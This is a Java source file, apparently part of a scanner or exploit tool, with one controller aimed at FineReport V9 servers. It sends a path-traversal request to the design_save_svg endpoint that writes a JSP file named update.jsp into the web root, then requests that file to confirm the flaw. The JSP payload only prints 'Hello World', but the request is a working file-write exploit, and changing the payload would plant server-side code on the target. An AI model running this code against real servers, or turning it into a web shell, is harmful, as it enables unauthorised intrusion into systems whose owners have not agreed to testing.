package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;

import java.net.MalformedURLException;

@BasicMapping(uri = "帆软OA")
public class fineReportController extends Controller implements BasicController{

    @VulnerabilityDescriptionMapping(Description = "帆软报表 V9 design_save_svg 任意文件覆盖文件上传",SupportVulType = SupportVul.UploadFile)
    public void vul_design_save_svg(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        Cache.uiController.logTextArea.appendText("\n开始检测：  vul_design_save_svg");
        String url = "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp";
        String data = "{\"__CONTENT__\":\"<%out.println(\\\"Hello World!\\\");%>\",\"__CHARSET__\":\"UTF-8\"}";
        switch (type){
            case EXP:
                new HttpRequest(target+url).Post(data);

                HttpRequest httpRequest2_exp = new HttpRequest(target+url);
                Response result2_exp = httpRequest2_exp.Get(target+"update.jsp");
                if(result2_exp.responseBody.contains("Hello World") && result2_exp.statusCode==200){
                    WriteExpLog("\n 存在漏洞");
                }else {
                    WriteExpLog("\n 不存在漏洞");
                }
                WriteExpLog("\n"+result2_exp.responseBody);
                break;
            case POC:
                new HttpRequest(target+url).Post(data);

                HttpRequest httpRequest2 = new HttpRequest(target+url);
                Response result2 = httpRequest2.Get(target+"update.jsp");
                if(result2.responseBody.contains("Hello World") && result2.statusCode==200){
                    WriteLog(" 存在漏洞");
                }else {
                    WriteLog(" 不存在漏洞");
                }
                WriteLog("\n"+result2.responseBody);
        }
    }
}
